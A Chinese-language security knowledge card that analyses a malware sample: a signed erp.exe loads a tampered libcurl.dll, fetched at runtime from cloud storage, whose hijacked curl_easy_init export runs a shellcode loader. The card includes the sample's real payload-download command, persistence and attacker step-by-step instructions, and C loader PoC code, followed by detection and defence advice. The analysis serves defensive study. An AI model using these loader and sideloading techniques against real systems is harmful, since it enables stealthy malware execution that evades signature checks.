---
id: code-analysis-reverse-windows-signed-exe-runtime-download-tampered-dll-export-hijack
title: 签名 EXE 不改、运行时下载被篡改的第三方 DLL：劫持 curl_easy_init 导出作为 loader 入口
type: scenario
domain: code-analysis
path: code-analysis/reverse/windows
technique: signed-exe-runtime-download-tampered-dll-export-hijack
aliases:
- 签名程序 + 篡改 DLL
- 运行时下载 DLL 侧加载
- curl_easy_init 被篡改
- 签名白利用 白加黑
- 偏门 DLL 劫持
- 动态下载恶意 DLL
tags:
- windows
- dll-sideload
- signed-binary
- evasion
- loader
- curl
- malware-analysis
cve: []
severity: high
confidence: medium
status: verified
created: '2026-11-11'
updated: '2026-11-11'
verification:
  verified_by: verifier-V528
  verified_at: '2026-11-11T15:09:53+08:00'
  notes: 已对照原文与img13/14/16核对：erp.exe网易签名、opk-- URLDownloadToFile下载libcurl.dll至C:\Windows\HAHA、curl_easy_init被篡改后CryptEnumOIDInfo执行均一致；按img13注释将下载URL由http更正为https。未验证点：未运行样本。dedup候选GUP libcurl侧加载等为本地打包投递，本卡为运行时下载，非同一链。
---

## 一句话结论

攻击者保持数字签名的正常程序（本例 `erp.exe`）完全不动，只让它运行时从互联网下载一个系统默认没有的第三方 DLL（`libcurl.dll`），并把该 DLL 的某个导出函数（`curl_easy_init`）替换成 shellcode loader；当签名程序调用这个导出时进入恶意代码，而静态查杀、签名校验看到的都是完好签名的宿主程序，恶意逻辑只存在于运行时才出现、且未签名的 DLL 中。

## 原理

- **信任链错位**：Authenticode 校验的是 EXE 自身的哈希/签名，不会因为同目录或运行时加载的 DLL 被替换而失效；杀软对"签名程序"通常降低怀疑，而恶意代码实际在被加载的 DLL 里。原文 `erp.exe` 带网易（NetEase Hangzhou）有效签名，落盘时杀软难以据此判恶。
- **运行时下载避开静态扫描**：恶意 DLL 不在安装包/释放物里，而是内存 DLL 先 `URLDownloadToFile` 从云存储（原文 `https://netopk.oss-cn-qingdao.aliyuncs.com/opk.jpg`）下载为 `C:\Windows\HAHA\libcurl.dll`，随后 `ShellExecuteA` 启动 `erp.exe`。安装包与落盘样本中都没有恶意 DLL，静态扫描/沙箱初次运行前看不到它。
- **选择偏门 DLL**：`libcurl.dll` 不是系统自带、宿主又确实依赖它（由宿主导入表/调用决定），攻击者可以自由提供同名实现；系统 DLL 侧加载会被 KnownDLLs 机制挡掉，第三方 DLL 没有这个保护。
- **导出劫持**：篡改后的 `curl_easy_init` 不再返回正常 handle，而是读取 `C:\Windows\HAHA\xo.had`、解密后把 shellcode 作为回调执行（原文用 `CryptEnumOIDInfo`），原函数后续逻辑永远走不到；宿主对调用失败/返回值异常不敏感时，恶意代码执行后进程继续运行，进一步降低行为异常。
- **为什么难发现**：宿主签名有效、文件名/版本信息正常；DLL 在运行时下载、可能随时更换；网络下载源是公共云存储；执行入口藏在正常导出函数调用中，调用栈看起来是宿主调用 libcurl。
- **边界**：宿主必须确实加载该 DLL 且调用被劫持的导出；DLL 搜索顺序/安全目录（System32、KnownDLLs）会限制放置位置；若宿主校验 DLL 签名/哈希或使用固定绝对路径加载，则失败。

## 触发条件

- 目标存在带数字签名、且会从自身目录/可写目录加载第三方 DLL 并调用其导出的程序（原文为 `erp.exe` + `libcurl.dll`）。
- 攻击者能控制该 DLL 的落地路径（同目录、`C:\Windows\HAHA` 等）且在宿主启动前/运行中写入。
- 宿主不校验被加载 DLL 的签名/哈希，或校验可绕过；系统未启用 WDAC/AppLocker 阻止用户目录 DLL 加载。
- 目标可访问攻击者的下载源（OSS/CDN/公网 HTTP）。

## 利用步骤

1. 选定签名宿主与它依赖的第三方 DLL（非系统 DLL、导出函数明确、宿主会无条件调用）。
2. 编写恶意 DLL：完整实现宿主导入表所需导出（至少被劫持的那个），在导出函数（如 `curl_easy_init`）中植入 loader；其余导出可转发/空实现以保证宿主不崩溃。
3. 准备二阶段载荷（加密 shellcode、配置文件等）与下载逻辑：由前置内存 DLL/脚本下载 DLL 与载荷到 `C:\Windows\HAHA` 等固定目录。
4. 启动签名宿主，宿主按搜索顺序加载同目录恶意 DLL，调用导出时进入 loader；loader 解密并执行 shellcode（可用回调 API 作为入口，见关联卡）。
5. 后续动作：原文内存 DLL 先"让 360tray 降权"、添加名为"系统日志同步"的计划任务、设置登录时执行 `erp.exe` 实现持久化，再下载 `libcurl.dll` 并启动宿主。
6. 验证：检查 `erp.exe` 的数字签名仍然有效、同目录 `libcurl.dll` 无签名/哈希与官方不符、进程网络访问云存储下载 DLL。

## PoC

```c
// 恶意 libcurl.dll 的导出（示意）：替换 curl_easy_init 为 loader
// 宿主 erp.exe 调用 curl_easy_init() 时进入本函数，原 libcurl 逻辑不再执行
__declspec(dllexport) void* curl_easy_init(void) {
    HANDLE h = CreateFileA("C:\\Windows\\HAHA\\xo.had", GENERIC_READ, 0, NULL,
                           OPEN_EXISTING, 0, NULL);
    DWORD size = GetFileSize(h, NULL);
    void *buf = VirtualAlloc(NULL, size, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    DWORD read = 0;
    ReadFile(h, buf, size, &read, NULL);
    // 原文：逐字节解密 ((b ^ 0x7B) + 0x7B) ^ 0x7B，再用 CryptEnumOIDInfo 回调执行
    // CryptEnumOIDInfo(0, 0, 0, (PFN_CRYPT_ENUM_OID_INFO)buf);
    return buf;
}
```

```text
前置内存 DLL（opk--）动作：
  URLDownloadToFile("https://netopk.oss-cn-qingdao.aliyuncs.com/opk.jpg",
                    "C:\\windows\\HAHA\\libcurl.dll", 0, NULL)
  ShellExecuteA(NULL, "open", "C:\\windows\\HAHA\\erp.exe", NULL, NULL, SW_SHOW)
持久化：计划任务"系统日志同步" + 用户登录执行 erp.exe
```

## 变体与关联

- 变体一：不下载而随安装包落地恶意 DLL（同目录侧加载），见 MSI/白加黑类卡片；本卡特点是"签名宿主保持原样 + 运行时下载"。
- 变体二：劫持的导出不限于 `curl_easy_init`，任意宿主会调用、签名校验覆盖不到的第三方 DLL 导出均可（如 `sqlite3_*`、插件接口、CRT 包装函数）。
- 变体三：DLL 下载后先做内存映射/反射加载，不落盘为文件，进一步规避文件扫描（需宿主支持从内存加载或 loader 自行映射）。
- 关联：[[pentest-initial-access-gup-libcurl-dll-sideload-lnk-zip]]（同为签名宿主 + 恶意 libcurl.dll 导出劫持，但候选是把 DLL 与宿主一起打包、由 LNK 启动本地侧加载；本卡是宿主原样保留、运行时从云存储下载 DLL 后再启动宿主，投递/落地方式不同）、[[code-analysis-reverse-windows-legit-dll-modification-bindiff]]（篡改合法 DLL 的差异定位）、[[pentest-initial-access-msi-wrapper-cab-expand-signed-host-dll-sideload]]（MSI 打包签名宿主 + 侧加载）、[[pentest-persistence-dll-search-order-hijack-proxy-forwarding]]（DLL 搜索顺序与代理转发）。
- 边界：宿主加载 DLL 的路径/顺序固定且受保护（System32、KnownDLLs、绝对路径）、或宿主校验 DLL 签名/哈希时失效；需要网络可达下载源；杀软对"签名程序加载无签名 DLL"有规则时可被发现。

## 检测与防御

- 检测：签名进程从用户可写目录/自身目录加载无签名或哈希不符的 DLL（尤其 `libcurl.dll`/`sqlite3.dll` 等第三方库）；进程先访问云存储/CDN 下载文件再启动同目录 EXE；DLL 导出实现与官方版本差异（BinDiff）；同一目录出现固定命名的持久化文件（`xo.had`、`.conf`）。
- 防御：对宿主依赖的第三方 DLL 做签名/哈希白名单校验；WDAC/AppLocker 限制用户可写目录与云下载目录的 DLL 加载；监控签名进程的异常模块加载；对关键软件使用完整安装包并校验文件完整性。
- 加固：DLL 搜索路径显式指定受保护目录；启用 SetDefaultDllDirectories/LOAD_LIBRARY_SEARCH_SYSTEM32；EDR 对"签名程序 + 无签名同目录 DLL"组合告警。
